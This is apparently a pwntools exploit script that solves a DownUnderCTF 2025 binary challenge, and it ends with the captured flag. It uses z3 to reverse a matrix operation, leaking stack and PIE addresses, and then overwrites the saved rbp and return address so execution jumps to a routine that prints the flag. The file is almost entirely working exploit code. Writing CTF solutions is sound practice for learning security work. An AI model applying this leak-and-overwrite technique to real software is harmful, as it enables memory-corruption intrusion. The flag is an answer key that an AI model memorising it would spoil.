from pwn import *
from pprint import pprint
from z3 import *


# use z3 to reverse the matrix
def recover_B_matrix(A, wanted):
    M = len(A)
    N = 16  # fixed

    # Define B as 16 symbolic 8-bit values (B is 16x1)
    B = [BitVec(f'b_{k}', 8) for k in range(N)]
    solver = Solver()

    # For each row in A, enforce: dot(A[i], B) % 256 == wanted[i]
    for i in range(M):
        total = BitVecVal(0, 8)
        for k in range(N):
            total = (total + A[i][k] * B[k]) & 0xFF  # emulate uint8
        solver.add(total == wanted[i])

    # Constrain B[k] to be in 0..255 (uint8)
    for k in range(N):
        solver.add(ULE(B[k], 255))

    if solver.check() == sat:
        model = solver.model()
        return [model.evaluate(B[k], model_completion=True).as_long() for k in range(N)]
    else:
        return None



elf = context.binary = ELF("main")
# p = remote("chal.2025.ductf.net",30002)
p = process(aslr=False)

# get B matrix 
p.sendlineafter(">","1")
p.recvline()
B = [[] for i in range(16)]
for i in range(16):
    for j in range(16):
        num = int(p.recvline().strip())
        B[j].append(num)


# get C array 
C = []
p.clean()
p.sendline("3")
for i in range(16):
    out = int(p.recvline().strip())
    C.append(out)
print()

# get the leaks
solve = recover_B_matrix(B,C)
stack_leak = u64(bytes(solve)[:8]) >> 8
pie_leak = u64(bytes(solve)[8:16]) >> 8
print("stack_leak",hex(stack_leak))
print("pie_leak",hex(pie_leak))
elf.address = pie_leak - 0x1dee
print("elf.address",hex(elf.address))

# point rbp = flag, and rip to main print B matrix option
rbp = p64(elf.address + 0x41d0)
rip = elf.address + 0x1d2A # point it to our flag
wanted = [i for i in b"!" + rbp + p64(rip)]
solve = recover_B_matrix(B,[i for i in wanted])
print("rip",hex(rip))
arr = solve


# enjoy the flag
# gdb.attach(p,f"b *{rip}")
p.sendlineafter(">","2")
for i in range(len(arr)):
    p.sendline(str(arr[i]))



p.recvline()
for i in range(200):
    leak = int(p.recvline().strip())
    print(chr(leak),end="")
p.clean()
p.interactive()

# DUCTF{0n3_ind3x3d_languag3s_ar3_b3tt3r_than_z3r0_ind3x3d_come_fite_me}  